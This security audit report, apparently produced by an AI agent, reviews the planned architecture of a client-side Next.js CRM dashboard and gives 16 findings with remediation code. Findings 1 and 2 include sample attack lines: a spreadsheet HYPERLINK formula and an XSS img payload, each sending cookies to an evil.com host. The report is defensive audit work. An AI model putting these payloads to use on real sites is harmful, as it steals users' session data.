# Security Audit Report -- CRM Dashboard

**Audit Date:** 2026-02-21
**Auditor:** Security Audit Agent (Claude Opus 4.6)
**Target:** Architecture document and planned design for CRM Dashboard
**Scope:** `/Users/mac/Documents/Claude projet/CRM/ARCHITECTURE.md`
**Framework:** Next.js 14 (App Router), client-side CSV parsing, Vercel deployment
**Audit Type:** Pre-implementation architecture review (no source code exists yet)
**Classification:** CONFIDENTIAL

---

## Executive Summary

This audit reviewed the technical architecture document for a CRM Dashboard application that parses uploaded CSV files containing sales deal data entirely on the client side. The architecture describes a Next.js 14 application deployed on Vercel with no backend, no authentication, no authorization, and no server-side processing of uploaded data.

**The application, as designed, processes Personally Identifiable Information (PII) -- including names, email addresses, company names, and financial data -- with no security controls whatsoever.**

### Risk Summary

| Severity | Count |
|----------|-------|
| Critical | 3     |
| High     | 5     |
| Medium   | 5     |
| Low      | 3     |
| **Total** | **16** |

---

## Finding 1: CSV Injection / Formula Injection

**Severity:** CRITICAL
**CVSS 3.1:** 8.6 (AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)
**CWE:** CWE-1236 (Improper Neutralization of Formula Elements in a CSV File)
**Location:** `CsvUploader.tsx`, `csv-parser.ts`, `DealsTable.tsx`

### Description

The architecture describes CSV file upload with PapaParse parsing and direct rendering into a data table (shadcn/ui DataTable via TanStack Table). There is no mention of any sanitization layer between parsing and rendering. The `Deal` interface includes multiple string fields (`firstName`, `lastName`, `email`, `company`, `industry`, `owner`, `tags`) that accept arbitrary string content from the CSV.

### Attack Scenario

1. An attacker crafts a CSV file where string fields contain formulas: `=HYPERLINK("https://evil.com/steal?cookie="&ENCODEURL(INDIRECT("A1")), "Click here")`
2. While browser-based rendering does not evaluate spreadsheet formulas natively, the risk materializes if:
   - The application later adds CSV/Excel **export** functionality (planned in V2 roadmap: "Export PDF (react-pdf ou jsPDF)").
   - Any field content is rendered using `dangerouslySetInnerHTML` or injected into DOM without escaping.
3. More immediately, fields beginning with `=`, `+`, `-`, `@`, `\t`, `\r` can exploit downstream consumers if the data is ever re-exported.

### Remediation

```typescript
// In csv-parser.ts -- sanitize every string field after PapaParse output
function sanitizeCsvField(value: string): string {
  if (typeof value !== 'string') return value;
  // Strip leading formula characters
  const dangerousChars = ['=', '+', '-', '@', '\t', '\r', '\n'];
  let sanitized = value.trim();
  while (dangerousChars.includes(sanitized.charAt(0))) {
    sanitized = sanitized.substring(1).trim();
  }
  // Escape any remaining HTML entities
  return sanitized
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}
```

- Apply this sanitization to ALL string fields in the mapping function inside `csv-parser.ts`.
- When V2 export is built, prefix all cell values with a single quote (`'`) in the exported spreadsheet to prevent formula evaluation.

---

## Finding 2: Cross-Site Scripting (XSS) via CSV Content Rendering

**Severity:** CRITICAL
**CVSS 3.1:** 8.1 (AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)
**CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation)
**Location:** `DealsTable.tsx`, `KpiCard.tsx`, `PriorityActions.tsx`, all chart components

### Description

The architecture specifies that CSV data is parsed and stored in a Zustand store, then rendered across five different views (KPI cards, pipeline charts, marketing charts, forecast charts, deals table). There is no mention of output encoding or content sanitization at any rendering layer.

If any React component renders CSV field values using `dangerouslySetInnerHTML`, or if field values are interpolated into HTML attributes (e.g., `href`, `title`, `onclick`), an attacker-controlled CSV can execute arbitrary JavaScript in the user's browser.

Even without `dangerouslySetInnerHTML`, consider that:
- Chart tooltip customizations in Recharts can render HTML.
- TanStack Table cell renderers can render arbitrary JSX.
- The `tags` field is an array of strings that may be rendered as badges -- if a tag contains `<img src=x onerror=alert(1)>`, it must be escaped.

### Attack Scenario

1. Attacker creates a CSV where `company` = `<img src=x onerror="fetch('https://evil.com/exfil?d='+document.cookie)">`
2. User uploads the CSV to the CRM Dashboard.
3. If the field is rendered without proper escaping, the JavaScript executes and exfiltrates session data or performs actions on behalf of the user.

### Remediation

- **Never use `dangerouslySetInnerHTML`** in any component that renders CSV-derived data. This should be a linting rule.
- Rely on React's default JSX escaping (rendering strings inside `{}` is safe by default in React).
- For Recharts custom tooltips and TanStack Table cell renderers, ensure all custom render functions return JSX text nodes, not raw HTML strings.
- Add an ESLint rule to flag `dangerouslySetInnerHTML`:
  ```json
  {
    "rules": {
      "react/no-danger": "error"
    }
  }
  ```

---

## Finding 3: No Authentication or Authorization

**Severity:** CRITICAL
**CVSS 3.1:** 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)
**CWE:** CWE-306 (Missing Authentication for Critical Function), CWE-862 (Missing Authorization)
**Location:** Entire application architecture

### Description

The architecture describes no authentication or authorization mechanism. The application is deployed on Vercel as a public-facing web application. Anyone with the URL can access the CRM Dashboard. While CSV data is uploaded per-session, the V1 roadmap plans localStorage/IndexedDB persistence, which means deal data (including PII) would persist on shared or public machines.

For a CRM system handling sales pipeline data with PII (names, emails, company details, deal values), the absence of access control is a fundamental architectural flaw.

### Attack Scenario

1. The Vercel deployment URL is discoverable (e.g., via DNS enumeration, Vercel subdomain patterns, or social sharing).
2. Any person can access the application.
3. If localStorage persistence is implemented (V1), a subsequent user on a shared machine can access the previous user's CRM data by visiting the same URL.

### Remediation

- Implement authentication before any data functionality is available. Recommended options for a Vercel-deployed Next.js app:
  - **NextAuth.js / Auth.js** with an OAuth provider (Google Workspace, Microsoft Entra ID).
  - **Clerk** or **Auth0** for managed authentication.
- Implement route-level middleware in Next.js to enforce authentication:
  ```typescript
  // middleware.ts
  import { withAuth } from "next-auth/middleware";
  export default withAuth({ pages: { signIn: "/login" } });
  export const config = { matcher: ["/((?!login|api/auth).*)"] };
  ```
- If localStorage/IndexedDB persistence is added, encrypt the data at rest using a key derived from the user's session.

---

## Finding 4: No File Upload Validation

**Severity:** HIGH
**CVSS 3.1:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)
**CWE:** CWE-434 (Unrestricted Upload of File with Dangerous Type), CWE-20 (Improper Input Validation)
**Location:** `CsvUploader.tsx`, `csv-parser.ts`

### Description

The architecture describes a drag-and-drop CSV upload component (`CsvUploader.tsx`) that feeds directly into PapaParse. There is no mention of:

- File extension validation
- MIME type checking
- File size limits
- Content validation before parsing
- Maximum row/column limits

### Attack Scenario

1. **Memory exhaustion:** A user (or attacker) uploads a 500MB file. PapaParse attempts to parse the entire file in browser memory, causing the tab to crash or the system to become unresponsive.
2. **Malformed input:** An RTF file (as noted in the architecture: "Le fichier Extraction.csv est actuellement encode en RTF") or binary file is uploaded. PapaParse may produce garbage output that propagates through the application.
3. **Zip bomb analog:** A specially crafted file with deeply nested quoted fields causes PapaParse to consume excessive CPU/memory.

### Remediation

```typescript
// In CsvUploader.tsx
const MAX_FILE_SIZE = 10 * 1024 * 1024; // 10 MB
const ALLOWED_TYPES = ['text/csv', 'text/plain', 'application/vnd.ms-excel'];
const ALLOWED_EXTENSIONS = ['.csv'];
const MAX_ROWS = 50_000;

function validateFile(file: File): { valid: boolean; error?: string } {
  const ext = file.name.substring(file.name.lastIndexOf('.')).toLowerCase();
  if (!ALLOWED_EXTENSIONS.includes(ext)) {
    return { valid: false, error: 'Only .csv files are accepted.' };
  }
  if (!ALLOWED_TYPES.includes(file.type) && file.type !== '') {
    return { valid: false, error: 'Invalid file type.' };
  }
  if (file.size > MAX_FILE_SIZE) {
    return { valid: false, error: 'File exceeds 10 MB limit.' };
  }
  return { valid: true };
}
```

- Validate the file BEFORE passing to PapaParse.
- Use PapaParse's `preview` option to limit parsed rows: `Papa.parse(file, { preview: MAX_ROWS })`.
- Validate that parsed output contains the expected column headers before proceeding.

---

## Finding 5: PII Exposure in Client-Side Memory and Storage

**Severity:** HIGH
**CVSS 3.1:** 7.1 (AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N)
**CWE:** CWE-312 (Cleartext Storage of Sensitive Information), CWE-200 (Exposure of Sensitive Information)
**Location:** `store.ts` (Zustand), V1 localStorage/IndexedDB plan, entire client-side architecture

### Description

The `Deal` interface contains the following PII fields:
- `firstName`, `lastName` -- personal names
- `email` -- email addresses
- `company` -- business affiliation
- `country` -- geographic location
- `dealValue` -- confidential financial data

This data is:
1. Stored unencrypted in JavaScript heap memory (Zustand store).
2. Planned for persistence in localStorage or IndexedDB (V1 roadmap) -- both are unencrypted and accessible to any JavaScript running on the same origin.
3. Accessible via browser developer tools by any person with physical or remote access to the machine.
4. Potentially cached by the browser, service workers, or browser extensions.

### GDPR Implications

If any CSV contains data of EU residents (the `country` field suggests international data), GDPR applies:
- **Article 5(1)(f):** Data must be processed with "appropriate security" -- client-side unencrypted storage does not qualify.
- **Article 25:** Data protection by design and by default is required.
- **Article 32:** Appropriate technical measures (encryption, pseudonymization) must be implemented.
- **Article 33/34:** A breach of this data would require notification to supervisory authorities within 72 hours and to affected individuals.

### Remediation

- **Immediate:** Do not persist PII in localStorage or IndexedDB without encryption. Use the Web Crypto API to encrypt data at rest:
  ```typescript
  async function encryptData(data: string, key: CryptoKey): Promise<ArrayBuffer> {
    const iv = crypto.getRandomValues(new Uint8Array(12));
    const encoded = new TextEncoder().encode(data);
    const encrypted = await crypto.subtle.encrypt(
      { name: 'AES-GCM', iv }, key, encoded
    );
    // Prepend IV to ciphertext for storage
    const result = new Uint8Array(iv.length + encrypted.byteLength);
    result.set(iv);
    result.set(new Uint8Array(encrypted), iv.length);
    return result.buffer;
  }
  ```
- **Architectural:** Consider whether PII needs to be on the client at all. An alternative design would parse the CSV server-side (Next.js API route or edge function), strip or pseudonymize PII, and send only aggregated/anonymized data to the client.
- **Session cleanup:** Implement a `clear()` function that is called on tab close (`beforeunload`) and on session timeout to wipe the Zustand store and any persisted storage.
- **Data minimization:** Only extract and store the fields strictly necessary for dashboard calculations. Names and emails are not needed for pipeline/forecast charts.

---

## Finding 6: Missing Security Headers

**Severity:** HIGH
**CVSS 3.1:** 6.1 (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)
**CWE:** CWE-693 (Protection Mechanism Failure), CWE-1021 (Improper Restriction of Rendered UI Layers)
**Location:** Vercel deployment configuration, `next.config.js` (not yet created)

### Description

The architecture does not mention any security headers. A Next.js application deployed on Vercel without explicit header configuration will lack critical protections:

- **Content-Security-Policy (CSP):** Without a CSP, any injected script (via XSS in CSV content) can execute freely, load external resources, and exfiltrate data.
- **X-Frame-Options / frame-ancestors:** Without this, the application can be embedded in an attacker's iframe for clickjacking attacks.
- **Strict-Transport-Security (HSTS):** Vercel serves HTTPS by default, but without HSTS the first request may be over HTTP.
- **X-Content-Type-Options:** Without `nosniff`, browsers may MIME-sniff uploaded content.
- **Referrer-Policy:** Without this, the full URL (potentially containing sensitive query parameters) leaks to external sites.
- **Permissions-Policy:** Without this, the page may access device APIs (camera, microphone, geolocation) unnecessarily.

### Remediation

```javascript
// next.config.js
const securityHeaders = [
  {
    key: 'Content-Security-Policy',
    value: [
      "default-src 'self'",
      "script-src 'self' 'unsafe-eval'",  // unsafe-eval needed for Next.js dev; remove in production
      "style-src 'self' 'unsafe-inline'",  // Tailwind uses inline styles
      "img-src 'self' data: blob:",
      "font-src 'self'",
      "connect-src 'self'",
      "frame-ancestors 'none'",
      "base-uri 'self'",
      "form-action 'self'",
    ].join('; '),
  },
  { key: 'X-Frame-Options', value: 'DENY' },
  { key: 'X-Content-Type-Options', value: 'nosniff' },
  { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
  { key: 'Strict-Transport-Security', value: 'max-age=63072000; includeSubDomains; preload' },
  { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=(), interest-cohort=()' },
  { key: 'X-DNS-Prefetch-Control', value: 'on' },
];

module.exports = {
  async headers() {
    return [{ source: '/(.*)', headers: securityHeaders }];
  },
};
```

---

## Finding 7: Unsafe Date Parsing and NaN Propagation

**Severity:** HIGH
**CVSS 3.1:** 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L)
**CWE:** CWE-704 (Incorrect Type Conversion or Cast), CWE-252 (Unchecked Return Value)
**Location:** `csv-parser.ts`, `calculations.ts`

### Description

The `Deal` interface defines three `Date` fields: `createdDate`, `lastContactDate`, `nextFollowupDate`. CSV fields are strings. If the date string is malformed, empty, or in an unexpected locale format, `new Date(value)` or `date-fns` parsing will produce `Invalid Date`. This value propagates through:

- **Deal cold calculation:** `lastContactDate < today - 14 days` -- comparison with `Invalid Date` yields `false`, silently hiding stale deals.
- **Untreated lead calculation:** `createdDate < today - 48h` -- same silent failure.
- **Forecast calculation:** `nextFollowupDate <= today + 30` -- NaN comparisons corrupt financial forecasts.
- **Deal velocity:** Average time between creation and closing -- a single NaN pollutes the entire average.

This is not just a bug; it is a data integrity issue that leads to incorrect business decisions based on corrupted metrics.

### Attack Scenario

1. An attacker (or simply a misconfigured CRM export) includes dates in format `DD/MM/YYYY` instead of `YYYY-MM-DD`.
2. `new Date("31/12/2025")` returns `Invalid Date`.
3. All forecasts, cold deal alerts, and velocity calculations silently produce wrong results.
4. Business decisions are made on corrupted data.

### Remediation

```typescript
import { parse, isValid } from 'date-fns';

const DATE_FORMATS = ['yyyy-MM-dd', 'MM/dd/yyyy', 'dd/MM/yyyy', 'yyyy/MM/dd'];

function parseDate(value: string): Date | null {
  if (!value || value.trim() === '') return null;
  for (const fmt of DATE_FORMATS) {
    const parsed = parse(value.trim(), fmt, new Date());
    if (isValid(parsed)) return parsed;
  }
  return null; // Explicit null, not Invalid Date
}
```

- All calculations must check for `null` dates before operating.
- Display a validation summary after upload showing how many rows had unparseable dates.
- Exclude rows with null critical dates from calculations rather than silently corrupting aggregates.

---

## Finding 8: Dependency Version Pinning and Supply Chain Risks

**Severity:** HIGH
**CVSS 3.1:** 5.9 (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N)
**CWE:** CWE-1395 (Dependency on Vulnerable Third-Party Component)
**Location:** `package.json` dependencies in `ARCHITECTURE.md`

### Description

All dependencies use caret (`^`) version ranges, and `lucide-react` uses `latest`. This introduces supply chain risks:

| Dependency | Version | Concern |
|-----------|---------|---------|
| `lucide-react` | `latest` | **Never use `latest` in production.** Any compromised or breaking release is automatically pulled. |
| `next` | `^14` | Allows any 14.x. Next.js has had critical vulnerabilities (e.g., CVE-2024-34351 -- SSRF in Server Actions, CVE-2025-29927 -- middleware authorization bypass). Must pin to a specific patched version. |
| `papaparse` | `^5` | No critical CVEs currently known, but caret range accepts any 5.x minor/patch. |
| `react` | `^18` | Generally stable, but should still be pinned for reproducibility. |
| `recharts` | `^2` | Has had XSS vulnerabilities in tooltip rendering in older 2.x versions. |
| `zustand` | `^4` | No known vulnerabilities, but caret range is unnecessary risk. |

### Remediation

1. **Pin `lucide-react` to a specific version immediately.** Using `latest` is a critical supply chain risk.
2. Use a lockfile (`package-lock.json` or `pnpm-lock.yaml`) and commit it to version control.
3. Pin all dependencies to exact versions or use tilde (`~`) ranges for patch-only updates.
4. Implement automated dependency scanning:
   - Enable **GitHub Dependabot** or **Snyk** for continuous vulnerability monitoring.
   - Add `npm audit` to the CI pipeline.
5. Generate a Software Bill of Materials (SBOM) for compliance and supply chain transparency:
   ```bash
   npx @cyclonedx/cyclonedx-npm --output-file sbom.json
   ```

---

## Finding 9: Zustand Store Data Exposure via DevTools

**Severity:** MEDIUM
**CVSS 3.1:** 4.3 (AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N)
**CWE:** CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)
**Location:** `store.ts`

### Description

Zustand stores are accessible via React DevTools and browser console. Any user (or browser extension) can execute `window.__ZUSTAND_STORE__` or inspect the React component tree to extract the full `deals` array, including all PII.

Additionally, the Zustand store shape includes no data segmentation -- all deal data lives in a single flat array. There is no separation between PII fields and analytical fields.

### Remediation

- In production builds, disable Zustand devtools middleware:
  ```typescript
  import { create } from 'zustand';
  import { devtools } from 'zustand/middleware';

  const useStore = create(
    process.env.NODE_ENV === 'development' ? devtools(storeImpl) : storeImpl
  );
  ```
- Consider splitting the store into a PII-containing store (cleared aggressively) and an analytics-only store (aggregated numbers, no PII).

---

## Finding 10: `dealValue` Parsing Without Validation

**Severity:** MEDIUM
**CVSS 3.1:** 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L)
**CWE:** CWE-20 (Improper Input Validation), CWE-681 (Incorrect Conversion between Numeric Types)
**Location:** `csv-parser.ts`, `calculations.ts`

### Description

The `dealValue` field is typed as `number` in the `Deal` interface, but it originates from a CSV string. Common issues:

- Currency symbols: `"$50,000"` or `"50.000,00 EUR"` will parse as `NaN`.
- Negative values: `"-5000"` could corrupt pipeline calculations.
- Extremely large values: `"999999999999999"` can cause floating-point precision issues in JavaScript.
- Formula injection: `"=1+1"` parsed as a number yields `NaN`, but the formula string persists if stored as a fallback string.

### Remediation

```typescript
function parseDealValue(raw: string): number {
  if (typeof raw !== 'string') return 0;
  // Remove currency symbols, spaces, and thousand separators
  const cleaned = raw.replace(/[^0-9.\-]/g, '');
  const value = parseFloat(cleaned);
  if (isNaN(value) || !isFinite(value)) return 0;
  if (value < 0) return 0; // Business rule: deal values should not be negative
  if (value > 1_000_000_000) return 0; // Sanity check upper bound
  return Math.round(value * 100) / 100; // Two decimal places
}
```

---

## Finding 11: No Content Security Policy for Inline Script Protection

**Severity:** MEDIUM
**CVSS 3.1:** 5.4 (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)
**CWE:** CWE-693 (Protection Mechanism Failure)
**Location:** Vercel deployment, `next.config.js`

### Description

This is an extension of Finding 6, specifically addressing the CSP nonce/hash requirement for Next.js. Next.js 14 with App Router injects inline scripts for hydration. A strict CSP that blocks all inline scripts will break the application. However, Next.js 14 supports CSP nonces:

### Remediation

```typescript
// middleware.ts
import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';

export function middleware(request: NextRequest) {
  const nonce = Buffer.from(crypto.randomUUID()).toString('base64');
  const cspHeader = `
    default-src 'self';
    script-src 'self' 'nonce-${nonce}';
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: blob:;
    font-src 'self';
    connect-src 'self';
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self';
  `.replace(/\n/g, '');

  const response = NextResponse.next();
  response.headers.set('Content-Security-Policy', cspHeader);
  response.headers.set('x-nonce', nonce);
  return response;
}
```

---

## Finding 12: RTF File Noted as CSV Source

**Severity:** MEDIUM
**CVSS 3.1:** 4.3 (AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:L)
**CWE:** CWE-436 (Interpretation Conflict)
**Location:** ARCHITECTURE.md line 151: "Le fichier Extraction.csv est actuellement encode en RTF"

### Description

The architecture explicitly notes that the demo data file (`Extraction.csv`) is "encoded in RTF (not a real CSV)." RTF files can contain embedded OLE objects, macros, and other active content. If PapaParse is given an RTF file:

1. PapaParse will not crash but will produce garbage output from RTF control codes.
2. RTF control codes like `{\rtf1\ansi...}` will be treated as field values and rendered in the UI.
3. If the application ever processes this server-side, RTF can be a vector for code execution via embedded objects.

### Remediation

- Add a content validation step that reads the first few bytes of the uploaded file and rejects it if it begins with `{\rtf` or any non-text magic bytes.
- Add clear user-facing error messages when a non-CSV file is detected.

---

## Finding 13: No Rate Limiting or Abuse Prevention

**Severity:** MEDIUM
**CVSS 3.1:** 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L)
**CWE:** CWE-770 (Allocation of Resources Without Limits or Throttling)
**Location:** `CsvUploader.tsx`

### Description

Since this is a client-side application with no backend, traditional rate limiting does not apply. However, the absence of any resource constraints means:

- Repeated rapid uploads can cause memory leaks if previous Zustand state is not properly cleaned.
- Multiple concurrent file reads via the File API can exhaust browser memory.
- No throttling on the number of rows processed per second.

### Remediation

- Implement client-side upload cooldown (e.g., disable the upload button for 3 seconds after each upload).
- Clear the previous Zustand store completely before processing a new upload.
- Use PapaParse's streaming mode for large files:
  ```typescript
  Papa.parse(file, {
    step: (row, parser) => {
      rowCount++;
      if (rowCount > MAX_ROWS) {
        parser.abort();
        showError(`File exceeds ${MAX_ROWS} row limit.`);
      }
    },
    complete: (results) => { /* ... */ }
  });
  ```

---

## Finding 14: Browser Extension and Third-Party Script Access to Deal Data

**Severity:** LOW
**CVSS 3.1:** 3.7 (AV:L/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N)
**CWE:** CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)
**Location:** Client-side architecture (all components)

### Description

All deal data exists in browser memory and potentially localStorage. Browser extensions (ad blockers, productivity tools, password managers) have full access to page DOM and JavaScript context. A malicious or compromised extension can:

- Read the entire Zustand store via `window.__REACT_DEVTOOLS_GLOBAL_HOOK__`.
- Intercept `FileReader` API calls to capture the raw CSV before parsing.
- Modify rendered data to manipulate business decisions.

### Remediation

- This risk is inherent to all client-side web applications and cannot be fully mitigated.
- Document this risk in the application's security documentation.
- Consider implementing Subresource Integrity (SRI) for all external scripts (if any are added).
- A CSP (Finding 6/11) significantly reduces the attack surface by preventing unauthorized script loading.

---

## Finding 15: No Audit Logging

**Severity:** LOW
**CVSS 3.1:** 3.1 (AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N)
**CWE:** CWE-778 (Insufficient Logging)
**Location:** Entire application architecture

### Description

The architecture describes no logging mechanism. For a CRM application handling business-critical data:

- No record of who uploaded what data and when.
- No record of which deals were viewed or by whom.
- No anomaly detection for unusual upload patterns.
- Compliance frameworks (SOC 2, ISO 27001, GDPR Article 30) require processing activity records.

### Remediation

- Implement client-side event logging that sends anonymized events to an analytics/logging service.
- At minimum, log: upload timestamp, file hash (SHA-256), row count, and parsing errors.
- Consider server-side logging via a Next.js API route that receives upload metadata.

---

## Finding 16: No Data Lifecycle Management

**Severity:** LOW
**CVSS 3.1:** 2.4 (AV:L/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N)
**CWE:** CWE-459 (Incomplete Cleanup)
**Location:** `store.ts`, V1 localStorage/IndexedDB plan

### Description

The architecture defines a `clear()` function in the Zustand store but does not specify when or how it is called. There is no defined data retention policy, no automatic expiration, and no session timeout.

### Remediation

- Call `clear()` on browser tab/window close via the `beforeunload` event.
- If localStorage/IndexedDB persistence is implemented, add a TTL (time-to-live) mechanism:
  ```typescript
  const DATA_TTL_MS = 24 * 60 * 60 * 1000; // 24 hours
  // On load, check timestamp and clear if expired
  if (Date.now() - storedTimestamp > DATA_TTL_MS) {
    clearStorage();
  }
  ```
- Implement a visible "Clear All Data" button in the UI.
- Document the data retention policy for GDPR compliance.

---

## Threat Model Summary (STRIDE)

| Threat Category | Applicable Findings | Risk Level |
|----------------|---------------------|------------|
| **Spoofing** | F3 (No Authentication) | Critical |
| **Tampering** | F1 (CSV Injection), F2 (XSS), F7 (Date Parsing), F10 (dealValue) | Critical |
| **Repudiation** | F15 (No Audit Logging) | Low |
| **Information Disclosure** | F5 (PII Exposure), F9 (DevTools), F14 (Browser Extensions) | High |
| **Denial of Service** | F4 (No File Validation), F13 (No Rate Limiting) | High |
| **Elevation of Privilege** | F3 (No Authorization), F6 (Missing Headers) | Critical |

---

## Prioritized Remediation Roadmap

### Phase 0 -- Immediate (Before Any Code Is Written)

| Priority | Finding | Action |
|----------|---------|--------|
| P0 | F3 | Design authentication into the architecture from day one. |
| P0 | F4 | Define file validation requirements in the architecture. |
| P0 | F6 | Add `next.config.js` security headers to the architecture spec. |

### Phase 1 -- During MVP Development

| Priority | Finding | Action |
|----------|---------|--------|
| P1 | F1 | Implement CSV field sanitization in `csv-parser.ts`. |
| P1 | F2 | Enforce no `dangerouslySetInnerHTML` via ESLint; verify all rendering is safe. |
| P1 | F7 | Implement robust date parsing with validation feedback. |
| P1 | F8 | Pin all dependency versions; remove `latest` from `lucide-react`. |
| P1 | F10 | Implement `dealValue` parsing with validation. |
| P1 | F12 | Add magic-byte file content validation. |

### Phase 2 -- Before V1 Release

| Priority | Finding | Action |
|----------|---------|--------|
| P2 | F5 | Encrypt any persisted data; implement data minimization. |
| P2 | F9 | Disable devtools in production; consider store splitting. |
| P2 | F11 | Implement CSP nonces for Next.js. |
| P2 | F13 | Add upload cooldown and streaming parsing. |
| P2 | F15 | Implement basic audit logging. |
| P2 | F16 | Implement data TTL and session cleanup. |

### Phase 3 -- Ongoing

| Priority | Finding | Action |
|----------|---------|--------|
| P3 | F8 | Automated dependency scanning in CI (Dependabot/Snyk). |
| P3 | F14 | Document residual browser extension risk. |
| P3 | All | Schedule periodic security review and penetration testing. |

---

## Compliance Gap Analysis

| Framework | Requirement | Current Status | Gap |
|-----------|------------|----------------|-----|
| **GDPR Art. 5(1)(f)** | Appropriate security for personal data | No security controls | CRITICAL GAP |
| **GDPR Art. 25** | Data protection by design | Not considered in architecture | CRITICAL GAP |
| **GDPR Art. 32** | Encryption, pseudonymization | No encryption planned | HIGH GAP |
| **GDPR Art. 30** | Records of processing activities | No logging | MEDIUM GAP |
| **OWASP ASVS L1** | Input validation (V5) | No validation | CRITICAL GAP |
| **OWASP ASVS L1** | Authentication (V2) | No authentication | CRITICAL GAP |
| **OWASP ASVS L1** | Session management (V3) | No sessions | CRITICAL GAP |
| **OWASP ASVS L1** | Output encoding (V5.3) | Not specified | HIGH GAP |

---

## Conclusion

The CRM Dashboard architecture, as documented, has **3 critical, 5 high, 5 medium, and 3 low severity findings**. The most significant architectural gap is the complete absence of authentication, authorization, and input validation for an application that processes PII and confidential business financial data.

Because this is a pre-implementation review, all findings can be addressed before any vulnerable code is written. This is the ideal time to incorporate security requirements into the architecture. The remediation roadmap above provides a phased approach that aligns security implementation with the project's existing MVP/V1/V2 release plan.

**Recommendation:** Do not proceed with implementation until Findings F3 (Authentication), F4 (File Validation), and F6 (Security Headers) are addressed in the architecture design. These are foundational controls that are significantly more expensive to retrofit than to build in from the start.

---

*Report generated by security audit agent. This document should be treated as CONFIDENTIAL and shared only with the development team and project stakeholders.*
